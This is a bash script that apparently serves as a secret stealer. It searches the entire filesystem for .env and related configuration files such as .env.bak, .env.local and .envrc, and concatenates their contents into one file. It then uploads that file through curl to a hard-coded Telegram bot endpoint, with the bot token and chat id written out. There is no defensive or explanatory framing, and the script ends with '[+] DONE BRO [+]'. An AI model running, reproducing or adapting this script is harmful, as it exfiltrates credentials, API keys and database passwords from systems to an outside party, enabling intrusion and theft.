#!/bin/bash
#wong_galek
asu=$(find / -type f -name "*.env" -o -name "*.env.bak" -o -name "*config.env" -o -name "*.env.dist" -o -name "*.env.dev" -o -name "*.env.local" -o -name "*.env.backup" -o -name "*.environment" -o -name "*.envrc" -o -name "*.envs" -o -name "*.env~" | grep -v 'Permission denied' > filene.txt; sed 's/^/cat /;' filene.txt > gass.sh; chmod +x gass.sh; > /dev/null)
asuu=$(bash gass.sh > omegalulx.txt)
path=$(find / -type f -name omegalulx.txt | grep -v 'Permission denied')
curl -s -F document=@$path https://api.telegram.org/bot6199377653:AAGqMXlP3ibXV8ZuNXrimMOcF6wB1-Q-zoE/sendDocument?chat_id=-1001724713678 | sed 's/\r//g' > /dev/null
echo "[+] DONE BRO [+]"